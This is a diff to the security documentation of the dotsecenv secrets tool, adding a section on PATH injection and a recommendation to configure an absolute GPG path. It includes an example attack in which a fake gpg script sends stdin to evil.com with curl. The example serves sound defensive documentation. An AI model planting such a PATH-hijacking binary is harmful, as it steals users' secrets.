@@ -126,6 +126,98 @@ dotsecenv refuses to encrypt/decrypt with weaker algorithms.
 
 In SUID mode, dotsecenv blocks write operations to prevent privilege escalation attacks. Read operations only.
 
+### PATH Injection Attacks
+
+dotsecenv supports configuring an **absolute path** to the GPG executable via `gpg.program`. This provides several security benefits:
+
+#### Why Absolute Paths Matter
+
+When GPG is resolved via PATH, an attacker who can influence the PATH environment variable can redirect all cryptographic operations to a malicious binary:
+
+```bash
+# Attacker prepends malicious directory to PATH
+export PATH=/tmp/evil:$PATH
+
+# Creates fake gpg that steals secrets
+cat > /tmp/evil/gpg << 'EOF'
+#!/bin/bash
+# Log all arguments and stdin to attacker
+curl -X POST https://evil.com/steal -d "$(cat)"
+# Then call real gpg to avoid detection
+/usr/bin/gpg "$@"
+EOF
+chmod +x /tmp/evil/gpg
+
+# Now dotsecenv unknowingly uses the malicious gpg
+dotsecenv secret get DATABASE_PASSWORD  # Secrets exfiltrated!
+```
+
+**With an absolute path configured**, this attack fails:
+
+```yaml
+gpg:
+  program: /usr/bin/gpg  # Always uses this exact binary
+```
+
+#### Security Benefits
+
+| Benefit | Description |
+|---------|-------------|
+| **PATH injection prevention** | Attackers cannot redirect GPG operations by modifying PATH, shell configs, or placing malicious binaries earlier in the search path |
+| **Deterministic execution** | The same binary executes regardless of shell configuration, environment state, or current working directory |
+| **Multi-version isolation** | Systems with multiple GPG installations (Homebrew, system, MacPorts) always use the explicitly configured version |
+| **Audit compliance** | Security teams can verify exactly which binary handles cryptographic operations |
+| **Container safety** | Works reliably in containers where PATH may be minimal or misconfigured |
+| **CI/CD reproducibility** | Different runners with different PATH configurations still use the same GPG binary |
+
+#### Wrapper Script Support
+
+An absolute path can point to a wrapper script for additional security controls:
+
+```bash
+#!/bin/bash
+# /usr/local/bin/gpg-audited
+# Wrapper that logs all GPG operations
+
+LOG_FILE="/var/log/gpg-audit.log"
+echo "$(date -Iseconds) USER=$USER CMD=gpg ARGS=$*" >> "$LOG_FILE"
+
+# Optional: Block dangerous operations
+if [[ "$*" == *"--delete-key"* ]]; then
+    echo "Error: Key deletion blocked by policy" >&2
+    exit 1
+fi
+
+exec /usr/bin/gpg "$@"
+```
+
+```yaml
+gpg:
+  program: /usr/local/bin/gpg-audited
+```
+
+This enables:
+- Audit logging of all cryptographic operations
+- Policy enforcement (block certain operations)
+- Integration with hardware security modules (HSMs)
+- Rate limiting to prevent abuse
+
+#### Strict Mode Requirement
+
+In **strict mode** (`strict: true`), dotsecenv requires an explicit `gpg.program` path:
+
+```yaml
+strict: true
+gpg:
+  program: /usr/bin/gpg  # Required in strict mode
+```
+
+This prevents accidental reliance on PATH resolution in security-sensitive environments.
+
+<Aside type="tip">
+For maximum security, always configure `gpg.program` with an absolute path, especially in production, CI/CD, and multi-user environments.
+</Aside>
+
 ---
 
 ## What dotsecenv Does NOT Protect Against
@@ -333,6 +425,7 @@ The security of your vault depends on:
 | File theft | Yes | Requires private key |
 | Tampering | Yes | Signature verification |
 | Weak algorithms | Yes | Config-enforced minimums |
+| PATH injection | Yes | Configure absolute `gpg.program` path |
 | Root access | No | OS-level compromise |
 | Key theft | No | Guard your private key |
 | Env snooping | No | Post-decryption risk |
